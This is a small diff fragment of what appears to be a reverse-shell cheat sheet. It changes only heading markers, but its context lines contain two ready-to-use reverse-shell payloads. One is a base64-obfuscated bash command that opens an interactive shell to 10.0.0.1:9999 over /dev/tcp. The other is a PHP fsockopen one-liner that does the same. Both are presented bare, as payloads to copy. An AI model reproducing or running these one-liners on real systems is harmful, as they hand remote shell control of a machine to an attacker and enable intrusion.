@@ -20,8 +20,8 @@ bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS85OTk5IDA+JjE=}|{base64,-d}|
 ```
 php -r '$sock=fsockopen("10.0.0.1",9999);exec("bash -i <&3 >&3 2>&3");'
 ```
-##
-##
+###
+###
 ```
 <?php 
 
